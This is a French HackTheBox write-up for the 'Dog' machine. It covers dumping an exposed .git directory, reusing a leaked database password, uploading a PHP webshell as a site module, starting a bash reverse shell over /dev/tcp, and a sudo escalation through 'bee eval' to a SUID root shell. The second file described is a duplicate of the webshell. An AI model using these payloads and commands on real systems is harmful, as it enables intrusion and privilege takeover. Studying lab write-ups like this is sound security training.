---
title: Dog
description: wouf wouf?
tags:
  - HTB
  - machine
  - reuse
  - bee
  - git
  - sql
date: 2026-04-12T15:47
tasks:
  - format
parent file:
  - "[[HTB MOC]]"
os: linux
difficulty: easy
category:
  - writeups
  - htb
season: "7"
seasonal: no
---
# Outline
## Foothold
- La page `.git/` est accessible au public.
- Des identifiants sont cachés dans le `.git/`: email puis mot de passe.
- L'accès admin au site permet d'upload un fichier `.tar.gz` en tant que module et obtenir un webshell donc un revshell.
## PrivEsc to user
- Le revshell nous permet de voir les noms d'utilisateur dans `/home`, le mot de passe déjà trouvé fonctionne pour un utilisateur.
## PrivEsc to root
- Cet utilisateur a le droit de lancer `bee` en sudo, en précisant l'environnement de lancement il est possible d'effectuer la commande `eval` et d'évaluer ainsi du php en tant que root, donc d'obtenir un rootshell.

# Foothold

Il est possible de voir les ports ouverts `22` et `80`. 

Avec bien sûr un site sur le port 80.
![[Pasted image 20260412162622.png]]

L'énumération ffuf montre quelques pages intéressantes mais une sort du lot:
![[Pasted image 20260413112827.png]]

git-dumper permet de récupérer tout ce dossier avec une simple commande:
```
git-dumper http://dog.htb/.git ./git-dump
```

Dans le fichier `settings.php` on arrive à lire
```
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
```

Normalement l'accès devrait être fait par la commande
```
mysql -u root -pBackDropJ2024DS2024 -h dog.htb roundcube -e "select * from users;" -E
```
mais comme l'accès est configuré pour du localhost il nous faut d'abord notre premier accès.

La personne qui a fait ce commit est `dog@dog.htb`, ce qui donne une première adresse email, et en cherchant avec un grep récursif il est possible de trouver un second utilisateur.
```
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

Heureusement, cette nouvelle adresse mail fonctionne avec le mot de passe trouvé précédemment.

Dans le site est disponible une page qui permet d'upload des modules manuellement. En créant deux fichiers, un contenant un shell en php
```
 <html>
    <body>
	    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
		    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
		    <input type="SUBMIT" value="Execute">
	    </form>
	    <pre>
		    <?php
		    if(isset($_GET['cmd']))
		    {
		    system($_GET['cmd']);
		    }
		    ?>
	    </pre>
    </body>
</html>
```
et un fichier info sur le shell
```
<html>
    <body>
	    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
		    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
		    <input type="SUBMIT" value="Execute">
	    </form>
	    <pre>
		    <?php
		    if(isset($_GET['cmd']))
		    {
		    system($_GET['cmd']);
		    }
		    ?>
		</pre>
	</body>
</html>
```
et en les compilant dans une archive tar
```
tar -cvzf shell.tar.gz shell
```
alors il est possible d'upload ce dossier tar sur le site web en tant que module et d'y accéder ensuite via l'url suivant
``
Après avoir upload ce module, il est accessible directement à `/modules/shell/shell.php`.
![[Pasted image 20260413162734.png]]

(attention il faut aller vite et ne pas ouvrir d'autre page sinon le module disparaît...)

Ce shell permet de s'envoyer un reverse shell sur son pc.
```
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.23/4444 0>&1'
```

![[Pasted image 20260413163014.png]]

# Privilege Escalation to user

Le mot de passe de l'utilisateur est à nouveau réutilisé pour l'utilisateur `johncusack:BackDropJ2024DS2024` et comme ça on a l'utilisateur et le flag `user.txt`.

# PrivEsc to root

L'utilisateur `johncusack` a accès à une commande avec sudo:
![[Pasted image 20260413165320.png]]

```
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

Il est possible d'exécuter une commande avec bee en spécifiant le chemin root
`sudo /usr/local/bin/bee --root=/var/www/html <cmd>`.

Les devs de bee ont gentiement laissé [un wiki](https://github.com/backdrop-contrib/bee/wiki/Usage) sur lequel il est possible de lire les différentes utilisations des commandes de bee, notamment `eval`:
```
sudo /usr/local/bin/bee --root=/var/www/html eval 'system("cp /bin/bash /tmp/rootshell; chmod 7777 /tmp/rootshell");'
/tmp/rootshell -p
```

Et voilà comment obtenir un terminal root!
![[Pasted image 20260413212145.png]]

![[Pasted image 20260413212223.png]]
